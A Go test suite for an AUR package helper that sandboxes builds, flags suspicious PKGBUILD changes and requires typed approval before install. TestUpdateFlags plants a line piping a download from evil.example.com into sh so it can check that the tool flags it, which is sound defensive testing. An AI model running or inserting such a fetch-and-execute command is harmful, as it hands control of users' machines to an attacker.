package app

import (
	"context"
	"fmt"
	"io"
	"os"
	"path/filepath"
	"slices"
	"strings"
	"testing"
	"time"

	"github.com/grunclepug/aurlock/internal/prompt"
	"github.com/grunclepug/aurlock/internal/store"
	"github.com/grunclepug/aurlock/internal/testaur"
)

var now = time.Date(2026, 10, 29, 12, 0, 0, 0, time.UTC)

type harness struct {
	t     *testing.T
	aur   *testaur.AUR
	home  string
	state string
}

func newHarness(t *testing.T) *harness {
	h := &harness{t: t, aur: testaur.New(t), home: t.TempDir(), state: t.TempDir()}
	t.Setenv("HOME", h.home)
	for _, k := range []string{"XDG_CONFIG_HOME", "XDG_STATE_HOME", "XDG_CACHE_HOME", "AURLOCK_AI"} {
		t.Setenv(k, "")
	}
	t.Setenv("PATH", testaur.Fakes(t, h.state)+":"+os.Getenv("PATH"))
	t.Setenv("PAGER", "cat")
	t.Setenv("GIT_PAGER", "cat")
	h.write("installed", "glibc 2.42-1\n")
	h.write("repo", "glibc\ngo\nmake\n")
	return h
}

func (h *harness) write(name, content string) {
	h.t.Helper()
	if err := os.WriteFile(filepath.Join(h.state, name), []byte(content), 0o644); err != nil {
		h.t.Fatal(err)
	}
}

func (h *harness) read(name string) string {
	data, _ := os.ReadFile(filepath.Join(h.state, name))
	return string(data)
}

// run runs aurlock and returns its exit code and output.
func (h *harness) run(stdin string, tty bool, args ...string) (int, string, string) {
	h.t.Helper()
	return h.runCtx(context.Background(), strings.NewReader(stdin), tty, args...)
}

func (h *harness) runCtx(ctx context.Context, stdin io.Reader, tty bool, args ...string) (int, string, string) {
	h.t.Helper()
	var stdout, stderr strings.Builder
	code := Run(ctx, Env{
		Args: args, Stdin: stdin, Stdout: &stdout, Stderr: &stderr,
		TTY: tty, Getenv: os.Getenv, AURURL: h.aur.URL, Now: func() time.Time { return now }, Version: "test",
	})
	return code, stdout.String(), stderr.String()
}

func (h *harness) approvedFile() string {
	return filepath.Join(h.home, ".config", "aurlock", "approved")
}

func (h *harness) approval(base string) (store.Approval, bool) {
	h.t.Helper()
	a, err := store.LoadApprovals(h.approvedFile())
	if err != nil {
		h.t.Fatal(err)
	}
	return a.Get(base)
}

func (h *harness) approve(base, commit, version string, online bool) {
	h.t.Helper()
	a, err := store.LoadApprovals(h.approvedFile())
	if err != nil {
		h.t.Fatal(err)
	}
	a.Set(store.Approval{PkgBase: base, Commit: commit, Version: version, Maintainer: "someone", Date: "2026-10-01", Online: online})
	if err := a.Save(); err != nil {
		h.t.Fatal(err)
	}
}

func (h *harness) installed(name string) (store.Installed, bool) {
	h.t.Helper()
	l, err := store.LoadInstalled(filepath.Join(h.home, ".local", "state", "aurlock", "installed"))
	if err != nil {
		h.t.Fatal(err)
	}
	return l.Get(name)
}

// markInstalled records a package as installed by aurlock at a commit.
func (h *harness) markInstalled(name, base, commit, version string) {
	h.t.Helper()
	path := filepath.Join(h.home, ".local", "state", "aurlock", "installed")
	l, err := store.LoadInstalled(path)
	if err != nil {
		h.t.Fatal(err)
	}
	l.Set(store.Installed{PkgName: name, PkgBase: base, Commit: commit, Version: version, Date: "2026-10-01"})
	if err := l.Save(); err != nil {
		h.t.Fatal(err)
	}
	h.write("installed", h.read("installed")+name+" "+version+"\n")
}

// logLines returns the logged commands that start with prefix.
func (h *harness) logLines(prefix string) []string {
	var out []string
	for l := range strings.Lines(h.read("log")) {
		if strings.HasPrefix(l, prefix) {
			out = append(out, strings.TrimSpace(l))
		}
	}
	return out
}

type pkgOpt func(pkgbuild, info *string)

func makedepends(dep string) pkgOpt {
	return func(p, i *string) {
		*p = strings.Replace(*p, "depends=('glibc')", "depends=('glibc')\nmakedepends=('"+dep+"')", 1)
		*i = strings.Replace(*i, "\tdepends = glibc\n", "\tmakedepends = "+dep+"\n\tdepends = glibc\n", 1)
	}
}

func depends(dep string) pkgOpt {
	return func(p, i *string) {
		*p = strings.Replace(*p, "depends=('glibc')", "depends=('glibc' '"+dep+"')", 1)
		*i = strings.Replace(*i, "\tdepends = glibc\n", "\tdepends = glibc\n\tdepends = "+dep+"\n", 1)
	}
}

func buildLine(line string) pkgOpt {
	return func(p, i *string) {
		*p = strings.Replace(*p, "package() {\n", "package() {\n  "+line+"\n", 1)
	}
}

func splitPkg(extra string) pkgOpt {
	return func(p, i *string) {
		*i += "\npkgname = " + extra + "\n"
	}
}

// pkgFiles is a minimal package base at a version.
func pkgFiles(base, version string, opts ...pkgOpt) map[string]string {
	ver, rel, _ := strings.Cut(version, "-")
	sum := strings.Repeat(strings.ReplaceAll(ver, ".", ""), 4)
	pkgbuild := fmt.Sprintf(`pkgname=%[1]s
pkgver=%[2]s
pkgrel=%[3]s
pkgdesc="A test package"
arch=('x86_64')
url="https://example.org"
license=('MIT')
depends=('glibc')
source=("https://dl.example.org/%[1]s-$pkgver.tar.gz")
sha256sums=('%[4]s')

package() {
  install -Dm755 %[1]s "$pkgdir/usr/bin/%[1]s"
}
`, base, ver, rel, sum)
	info := fmt.Sprintf(`pkgbase = %[1]s
	pkgdesc = A test package
	pkgver = %[2]s
	pkgrel = %[3]s
	url = https://example.org
	arch = x86_64
	license = MIT
	depends = glibc
	source = https://dl.example.org/%[1]s-%[2]s.tar.gz
	sha256sums = %[4]s

pkgname = %[1]s
`, base, ver, rel, sum)
	for _, o := range opts {
		o(&pkgbuild, &info)
	}
	return map[string]string{"PKGBUILD": pkgbuild, ".SRCINFO": info}
}

const author = "Some One <someone@example.org>"

// publish commits a version to the fake AUR and sets its RPC data.
func (h *harness) publish(base, version string, age time.Duration, opts ...pkgOpt) string {
	h.t.Helper()
	commit := h.aur.Commit(base, author, pkgFiles(base, version, opts...))
	h.aur.SetInfo(testaur.Package{Name: base, Base: base, Version: version, Maintainer: "someone", FirstSubmitted: now.Add(-age).Unix()})
	return commit
}

const old = 400 * 24 * time.Hour

func TestFirstInstall(t *testing.T) {
	h := newHarness(t)
	head := h.publish("solidcraft-bin", "0.25.1-1", 5*24*time.Hour)
	code, stdout, stderr := h.run("v\nsolidcraft-bin\n", true, "install", "solidcraft-bin")
	if code != 0 {
		t.Fatalf("exit %d\n%s\n%s", code, stdout, stderr)
	}
	for _, want := range []string{
		"solidcraft-bin 0.25.1-1 (new)   1 flag\n  ! who:   first submitted 5 days ago\n  · downloads from dl.example.org\n",
		"==> PKGBUILD <==\npkgname=solidcraft-bin\n",
		`type "solidcraft-bin" to approve, or [c]laude / [v]iew / [n]o: `,
	} {
		if !strings.Contains(stdout, want) {
			t.Errorf("stdout lacks %q:\n%s", want, stdout)
		}
	}
	ap, ok := h.approval("solidcraft-bin")
	if !ok || ap.Commit != head || ap.Version != "0.25.1-1" || ap.Maintainer != "someone" || ap.Online || ap.Date != "2026-10-29" {
		t.Errorf("approval = %+v", ap)
	}
	in, ok := h.installed("solidcraft-bin")
	if !ok || in.Commit != head || in.PkgBase != "solidcraft-bin" {
		t.Errorf("installed = %+v", in)
	}
	bw := h.logLines("bwrap")
	if len(bw) != 2 {
		t.Fatalf("bwrap calls: %v", bw)
	}
	fetch, build := bw[0], bw[1]
	for _, want := range []string{"--disable-userns", "--die-with-parent", "--new-session", "--clearenv", "--ro-bind /usr /usr", "--setenv HOME /tmp/home", "-- makepkg --verifysource --noconfirm"} {
		if !strings.Contains(fetch, want) {
			t.Errorf("fetch lacks %q: %s", want, fetch)
		}
	}
	if strings.Contains(fetch, "--unshare-net") || !strings.Contains(build, "--unshare-net") || !strings.HasSuffix(build, "-- makepkg --holdver --noconfirm") {
		t.Errorf("network: fetch %s\nbuild %s", fetch, build)
	}
	if strings.Contains(fetch, h.home+" ") || strings.Contains(fetch, "--bind "+h.home+"/.ssh") {
		t.Errorf("home mounted: %s", fetch)
	}
	work := filepath.Join(h.home, ".cache", "aurlock", "build", "solidcraft-bin")
	if !strings.Contains(build, "--bind "+work+" "+work) || !strings.Contains(build, "--chdir "+work) {
		t.Errorf("work dir: %s", build)
	}
	pkg := filepath.Join(h.home, ".cache", "aurlock", "pkg", "solidcraft-bin", "solidcraft-bin-0.25.1-1-x86_64.pkg.tar.zst")
	if got := h.logLines("sudo"); !slices.Equal(got, []string{"sudo pacman -U -- " + pkg}) {
		t.Errorf("sudo calls: %v", got)
	}
}

func TestFirstInstallDeclined(t *testing.T) {
	h := newHarness(t)
	h.publish("foo", "1.0-1", old)
	for _, in := range []string{"n\n", "", "x\n"} {
		code, stdout, _ := h.run(in, true, "install", "foo")
		if code != 0 || !strings.Contains(stdout, "skipped foo") {
			t.Errorf("%q: exit %d\n%s", in, code, stdout)
		}
	}
	if _, ok := h.approval("foo"); ok {
		t.Error("declined package approved")
	}
	if len(h.logLines("bwrap")) != 0 || len(h.logLines("sudo")) != 0 {
		t.Errorf("built or installed: %s", h.read("log"))
	}
}

func TestCleanFirstInstallTakesY(t *testing.T) {
	h := newHarness(t)
	h.publish("foo", "1.0-1", old)
	code, stdout, stderr := h.run("y\n", true, "install", "foo")
	if code != 0 || !strings.Contains(stdout, "foo 1.0-1 (new)   no flags\n") || !strings.Contains(stdout, "approve and install? [y/N/c/v] ") {
		t.Fatalf("exit %d\n%s\n%s", code, stdout, stderr)
	}
	if _, ok := h.installed("foo"); !ok {
		t.Error("not installed")
	}
}

func TestUpgrade(t *testing.T) {
	h := newHarness(t)
	c1 := h.publish("solidcraft-bin", "0.25.1-1", old)
	h.approve("solidcraft-bin", c1, "0.25.1-1", true)
	h.markInstalled("solidcraft-bin", "solidcraft-bin", c1, "0.25.1-1")
	c2 := h.publish("solidcraft-bin", "0.26.0-1", old)

	code, stdout, _ := h.run("", false, "outdated")
	if code != 1 || stdout != "solidcraft-bin 0.25.1-1 -> 0.26.0-1 (needs review)\n" {
		t.Errorf("outdated: exit %d %q", code, stdout)
	}

	code, stdout, stderr := h.run("d\ny\n", true, "upgrade")
	if code != 0 {
		t.Fatalf("exit %d\n%s\n%s", code, stdout, stderr)
	}
	for _, want := range []string{
		"solidcraft-bin 0.25.1-1 → 0.26.0-1   no flags\n",
		"approve and install? [y/N/c/v/d/g] ",
		"-pkgver=0.25.1\n+pkgver=0.26.0\n",
	} {
		if !strings.Contains(stdout, want) {
			t.Errorf("stdout lacks %q:\n%s", want, stdout)
		}
	}
	// Approving a new commit resets the network grant.
	if ap, _ := h.approval("solidcraft-bin"); ap.Commit != c2 || ap.Online {
		t.Errorf("approval = %+v", ap)
	}
	if in, _ := h.installed("solidcraft-bin"); in.Commit != c2 || in.Version != "0.26.0-1" {
		t.Errorf("installed = %+v", in)
	}
	code, stdout, _ = h.run("", false, "outdated")
	if code != 0 || stdout != "" {
		t.Errorf("outdated after upgrade: exit %d %q", code, stdout)
	}
	code, stdout, _ = h.run("", false, "upgrade")
	if code != 0 || stdout != "nothing to upgrade\n" {
		t.Errorf("second upgrade: exit %d %q", code, stdout)
	}
}

func TestUpgradeApprovedElsewhere(t *testing.T) {
	h := newHarness(t)
	c1 := h.publish("foo", "1.0-1", old)
	h.markInstalled("foo", "foo", c1, "1.0-1")
	c2 := h.publish("foo", "1.1-1", old)
	// Another machine approved the new commit; it arrived through sync.
	h.approve("foo", c2, "1.1-1", false)

	code, stdout, _ := h.run("", false, "outdated")
	if code != 1 || stdout != "foo 1.0-1 -> 1.1-1 (approved)\n" {
		t.Errorf("outdated: exit %d %q", code, stdout)
	}
	code, stdout, stderr := h.run("", false, "upgrade")
	if code != 0 || strings.Contains(stdout, "approve and install?") {
		t.Fatalf("exit %d\n%s\n%s", code, stdout, stderr)
	}
	if in, _ := h.installed("foo"); in.Commit != c2 {
		t.Errorf("installed = %+v", in)
	}
}

func TestUpdateFlags(t *testing.T) {
	h := newHarness(t)
	c1 := h.publish("foo", "1.0-1", old)
	h.approve("foo", c1, "1.0-1", false)
	h.markInstalled("foo", "foo", c1, "1.0-1")
	files := pkgFiles("foo", "1.1-1", buildLine("curl -s https://evil.example.com/x | sh"))
	h.aur.Commit("foo", "Mallory <mallory@example.net>", files)

	code, stdout, _ := h.run("y\n", true, "upgrade")
	if code != 0 {
		t.Fatalf("exit %d", code)
	}
	for _, want := range []string{
		"foo 1.0-1 → 1.1-1   4 flags\n",
		"  ! who:   new commit author: Mallory <mallory@example.net>\n",
		"  ! where: URL host evil.example.com isn't among .SRCINFO's sources (PKGBUILD:13)\n",
		"  ! what:  curl in package() (PKGBUILD:13)\n",
		"  ! what:  pipe into a shell in package() (PKGBUILD:13)\n",
		"skipped foo: a flagged package needs its name typed\n",
	} {
		if !strings.Contains(stdout, want) {
			t.Errorf("stdout lacks %q:\n%s", want, stdout)
		}
	}
	if ap, _ := h.approval("foo"); ap.Commit != c1 {
		t.Error("approval moved")
	}
}

func TestNoconfirm(t *testing.T) {
	h := newHarness(t)
	head := h.publish("solidcraft-bin", "0.25.1-1", old)
	code, stdout, stderr := h.run("", false, "--removemake", "-S", "--needed", "--noconfirm", "solidcraft-bin")
	if code != 1 || stderr != "aurlock: solidcraft-bin: needs review: run aurlock install solidcraft-bin\n" {
		t.Errorf("unapproved: exit %d\n%s\n%s", code, stdout, stderr)
	}
	if _, ok := h.approval("solidcraft-bin"); ok || len(h.logLines("sudo")) != 0 {
		t.Fatal("--noconfirm approved or installed")
	}

	h.approve("solidcraft-bin", head, "0.25.1-1", false)
	code, stdout, stderr = h.run("", false, "--removemake", "-S", "--needed", "--noconfirm", "solidcraft-bin")
	if code != 0 {
		t.Fatalf("approved: exit %d\n%s\n%s", code, stdout, stderr)
	}
	if got := h.logLines("sudo"); len(got) != 1 || !strings.HasPrefix(got[0], "sudo pacman -U --noconfirm -- ") {
		t.Errorf("sudo calls: %v", got)
	}
	// --needed: installed at the approved commit, so nothing happens.
	os.Remove(filepath.Join(h.state, "log"))
	code, _, stderr = h.run("", false, "--removemake", "-S", "--needed", "--noconfirm", "solidcraft-bin")
	if code != 0 || stderr != "" || len(h.logLines("bwrap")) != 0 || len(h.logLines("sudo")) != 0 {
		t.Errorf("needed: exit %d %q\n%s", code, stderr, h.read("log"))
	}
}

func TestNotATerminal(t *testing.T) {
	h := newHarness(t)
	h.publish("foo", "1.0-1", old)
	code, _, stderr := h.run("y\n", false, "install", "foo")
	if code != 1 || !strings.Contains(stderr, "foo: needs review, but stdin isn't a terminal") {
		t.Errorf("exit %d %q", code, stderr)
	}
}

func TestRemovemake(t *testing.T) {
	h := newHarness(t)
	head := h.publish("foo", "1.0-1", old, makedepends("go"))
	h.approve("foo", head, "1.0-1", false)
	code, _, stderr := h.run("", false, "--removemake", "-S", "--needed", "--noconfirm", "foo")
	if code != 0 {
		t.Fatalf("exit %d %s", code, stderr)
	}
	got := h.logLines("sudo")
	want := []string{"sudo pacman -S --needed --asdeps --noconfirm -- go"}
	if len(got) != 3 || got[0] != want[0] || !strings.HasPrefix(got[1], "sudo pacman -U") || got[2] != "sudo pacman -Rns --noconfirm -- go" {
		t.Errorf("sudo calls: %v", got)
	}
}

func TestAURDependency(t *testing.T) {
	h := newHarness(t)
	h.publish("foo", "1.0-1", old, depends("libbar>=2"))
	code, _, stderr := h.run("y\n", true, "install", "foo")
	if code != 1 || !strings.Contains(stderr, "aurlock: foo: needs AUR package libbar: install it with aurlock first") {
		t.Errorf("exit %d %q", code, stderr)
	}
	// Once installed, it's fine.
	h.write("installed", h.read("installed")+"libbar 2.1-1\n")
	if code, _, stderr := h.run("y\n", true, "install", "foo"); code != 0 {
		t.Errorf("exit %d %q", code, stderr)
	}
}

func TestSplitPackage(t *testing.T) {
	h := newHarness(t)
	head := h.publish("foo", "1.0-1", old, splitPkg("foo-docs"))
	h.aur.SetInfo(testaur.Package{Name: "foo-docs", Base: "foo", Version: "1.0-1", Maintainer: "someone", FirstSubmitted: now.Add(-old).Unix()})
	code, stdout, stderr := h.run("y\n", true, "install", "foo-docs")
	if code != 0 {
		t.Fatalf("exit %d\n%s\n%s", code, stdout, stderr)
	}
	got := h.logLines("sudo")
	if len(got) != 1 || !strings.HasSuffix(got[0], "/foo-docs-1.0-1-x86_64.pkg.tar.zst") {
		t.Errorf("sudo calls: %v", got)
	}
	if in, ok := h.installed("foo-docs"); !ok || in.PkgBase != "foo" || in.Commit != head {
		t.Errorf("installed = %+v", in)
	}
	if _, ok := h.installed("foo"); ok {
		t.Error("foo installed too")
	}
}

func TestNetworkGrant(t *testing.T) {
	h := newHarness(t)
	head := h.publish("foo", "1.0-1", old)
	h.approve("foo", head, "1.0-1", false)
	h.write("build-fails", "curl: (6) Could not resolve host: registry.npmjs.org\n")
	code, _, stderr := h.run("", false, "install", "foo")
	if code != 1 || !strings.Contains(stderr, "may need network access") || !strings.Contains(stderr, "run aurlock install foo to grant it") {
		t.Fatalf("exit %d %q", code, stderr)
	}
	os.Remove(filepath.Join(h.state, "build-fails"))
	os.Remove(filepath.Join(h.state, "log"))

	code, stdout, stderr := h.run("foo\n", true, "install", "foo")
	if code != 0 || !strings.Contains(stdout, `type "foo" to grant network for this commit`) {
		t.Fatalf("exit %d\n%s\n%s", code, stdout, stderr)
	}
	if ap, _ := h.approval("foo"); !ap.Online || ap.Commit != head {
		t.Errorf("approval = %+v", ap)
	}
	if bw := h.logLines("bwrap"); len(bw) != 2 || strings.Contains(bw[1], "--unshare-net") {
		t.Errorf("build still offline: %v", bw)
	}
	// A successful build clears the hint: no more grant prompt.
	code, stdout, _ = h.run("", true, "install", "foo")
	if code != 0 || strings.Contains(stdout, "grant network") {
		t.Errorf("exit %d\n%s", code, stdout)
	}
}

func TestSecondOpinion(t *testing.T) {
	h := newHarness(t)
	h.publish("foo", "1.0-1", 3*24*time.Hour)
	code, stdout, _ := h.run("c\nn\n", true, "install", "foo")
	if code != 0 || !strings.Contains(stdout, "second opinion (advice only):\n  Malicious likelihood: low\n  Recommendation: approve\n") {
		t.Fatalf("exit %d\n%s", code, stdout)
	}
	if _, ok := h.approval("foo"); ok {
		t.Error("approved")
	}
	args := strings.Split(strings.TrimSuffix(h.read("claude-args"), "\n"), "\n")
	if !slices.Equal(args, prompt.DefaultAI[1:]) {
		t.Errorf("claude args = %q", args)
	}
	if dir := h.read("claude-dir"); !strings.Contains(dir, "aurlock-ai-") {
		t.Errorf("claude ran in %q", dir)
	}
	p := h.read("claude-prompt")
	for _, want := range []string{"first submitted 3 days ago", prompt.Marker + "\n==> PKGBUILD <==\npkgname=foo\n"} {
		if !strings.Contains(p, want) {
			t.Errorf("prompt lacks %q", want)
		}
	}
	// AURLOCK_AI replaces the command.
	t.Setenv("AURLOCK_AI", "echo custom verdict")
	_, stdout, _ = h.run("c\nn\n", true, "install", "foo")
	if !strings.Contains(stdout, "  custom verdict\n") {
		t.Errorf("custom AI:\n%s", stdout)
	}
}

func TestPacmanPassthrough(t *testing.T) {
	h := newHarness(t)
	h.markInstalled("foo", "foo", strings.Repeat("a", 40), "1.0-1")
	h.markInstalled("bar", "bar", strings.Repeat("b", 40), "1.0-1")
	if code, _, stderr := h.run("", false, "-D", "--asdeps", "foo"); code != 0 {
		t.Fatalf("-D: exit %d %s", code, stderr)
	}
	if code, _, stderr := h.run("", false, "-Rns", "--noconfirm", "foo"); code != 0 {
		t.Fatalf("-R: exit %d %s", code, stderr)
	}
	got := h.logLines("sudo")
	if !slices.Equal(got, []string{"sudo pacman -D --asdeps foo", "sudo pacman -Rns --noconfirm foo"}) {
		t.Errorf("sudo calls: %v", got)
	}
	if _, ok := h.installed("foo"); ok {
		t.Error("removed package still recorded")
	}
	if _, ok := h.installed("bar"); !ok {
		t.Error("other package dropped")
	}
}

func TestBadArguments(t *testing.T) {
	h := newHarness(t)
	for _, args := range [][]string{
		{"-Syu"},
		{"-S", "--asdeps", "foo"},
		{"-S", "-R", "foo"},
		{"--needed", "foo"},
		{"install"},
		{"install", "../foo"},
		{"frobnicate"},
		{"upgrade", "foo"},
		{},
	} {
		if code, _, _ := h.run("", false, args...); code != 2 {
			t.Errorf("%q: exit %d", args, code)
		}
	}
	h.aur.SetInfo(testaur.Package{Name: "known", Base: "known", Version: "1-1", Maintainer: "x"})
	if code, _, stderr := h.run("", false, "install", "nosuchpkg"); code != 2 || !strings.Contains(stderr, "nosuchpkg: not in the AUR") {
		t.Errorf("unknown package: %d %q", code, stderr)
	}
	if code, stdout, _ := h.run("", false, "-version"); code != 0 || stdout != "aurlock test\n" {
		t.Errorf("-version: %d %q", code, stdout)
	}
}

func TestListAndForget(t *testing.T) {
	h := newHarness(t)
	c := strings.Repeat("c", 40)
	h.approve("foo", c, "1.0-1", true)
	h.approve("baz", strings.Repeat("d", 40), "2.0-1", false)
	h.markInstalled("foo-docs", "foo", c, "1.0-1")
	code, stdout, _ := h.run("", false, "list")
	want := "approved:\n" +
		"  baz 2.0-1  dddddddddddd  someone 2026-10-01\n" +
		"  foo 1.0-1  cccccccccccc  someone 2026-10-01  network\n" +
		"installed here:\n" +
		"  foo-docs 1.0-1  cccccccccccc  2026-10-01\n"
	if code != 0 || stdout != want {
		t.Errorf("list: exit %d\n%s\nwant\n%s", code, stdout, want)
	}
	// forget takes a package name too.
	code, stdout, _ = h.run("", false, "forget", "foo-docs", "baz")
	if code != 0 || stdout != "forgot foo\nforgot baz\n" {
		t.Errorf("forget: exit %d %q", code, stdout)
	}
	if code, _, stderr := h.run("", false, "forget", "foo"); code != 1 || !strings.Contains(stderr, "foo: no approval") {
		t.Errorf("forget again: exit %d %q", code, stderr)
	}
	if _, ok := h.installed("foo-docs"); !ok {
		t.Error("forget uninstalled")
	}
}

func TestUntracked(t *testing.T) {
	h := newHarness(t)
	c := strings.Repeat("c", 40)
	h.approve("foo", c, "1.0-1", false)
	h.markInstalled("foo", "foo", c, "1.0-1")
	// Installed before aurlock, and a locally built package.
	h.write("installed", h.read("installed")+"zen-browser-bin 1.23.1b-1\nstream 0.3.0-1\n")
	h.aur.SetInfo(testaur.Package{Name: "zen-browser-bin", Base: "zen-browser-bin", Version: "1.23.4b-1", Maintainer: "x"})

	code, stdout, _ := h.run("", false, "list")
	want := "untracked foreign packages (aurlock didn't install these):\n" +
		"  stream 0.3.0-1              not in the AUR\n" +
		"  zen-browser-bin 1.23.1b-1   AUR has 1.23.4b-1\n" +
		"adopt them with: aurlock install <pkg>...\n"
	if code != 0 || !strings.HasSuffix(stdout, want) {
		t.Errorf("list: exit %d\n%s\nwant suffix\n%s", code, stdout, want)
	}

	// foo isn't outdated: the AUR has no repository for it here, so give it one.
	head := h.publish("foo", "1.0-1", old)
	h.markInstalled("foo", "foo", head, "1.0-1")
	code, stdout, stderr := h.run("", false, "outdated")
	if code != 0 || stdout != "" || stderr != "aurlock: 1 untracked AUR package, see aurlock list\n" {
		t.Errorf("outdated: exit %d %q %q", code, stdout, stderr)
	}
}

func TestConflictWarning(t *testing.T) {
	h := newHarness(t)
	dir := filepath.Dir(h.approvedFile())
	os.MkdirAll(dir, 0o755)
	os.WriteFile(filepath.Join(dir, "approved.sync-conflict-20261029-101500-ABCDEFG"), nil, 0o644)
	_, _, stderr := h.run("", false, "list")
	if !strings.Contains(stderr, "warning: approvals conflict") {
		t.Errorf("no warning: %q", stderr)
	}
}

func TestInterruptAtPrompt(t *testing.T) {
	h := newHarness(t)
	h.publish("foo", "1.0-1", old)
	r, w := io.Pipe()
	defer w.Close()
	ctx, cancel := context.WithCancel(context.Background())
	go func() {
		// Ctrl-C while the prompt waits for an answer.
		for !strings.Contains(h.read("log"), "pacman -T") {
			time.Sleep(10 * time.Millisecond)
		}
		time.Sleep(100 * time.Millisecond)
		cancel()
	}()
	code, _, stderr := h.runCtx(ctx, r, true, "install", "foo")
	if code != 130 || stderr != "\naurlock: interrupted\n" {
		t.Errorf("exit %d %q", code, stderr)
	}
	if _, ok := h.approval("foo"); ok {
		t.Error("approved")
	}
}

func TestBuildsReviewedBytes(t *testing.T) {
	h := newHarness(t)
	files := pkgFiles("foo", "1.0-1")
	// git archive would expand this from the commit message.
	files["PKGBUILD"] += "# $Format:%B$\n"
	files[".gitattributes"] = "PKGBUILD export-subst\n"
	head := h.aur.Commit("foo", author, files)
	h.aur.SetInfo(testaur.Package{Name: "foo", Base: "foo", Version: "1.0-1", Maintainer: "someone", FirstSubmitted: now.Add(-old).Unix()})
	h.approve("foo", head, "1.0-1", false)
	if code, _, stderr := h.run("", false, "install", "foo"); code != 0 {
		t.Fatalf("exit %d %s", code, stderr)
	}
	built, _ := os.ReadFile(filepath.Join(h.home, ".cache", "aurlock", "build", "foo", "PKGBUILD"))
	if string(built) != files["PKGBUILD"] {
		t.Errorf("built PKGBUILD differs from the reviewed one:\n%s", built)
	}
}
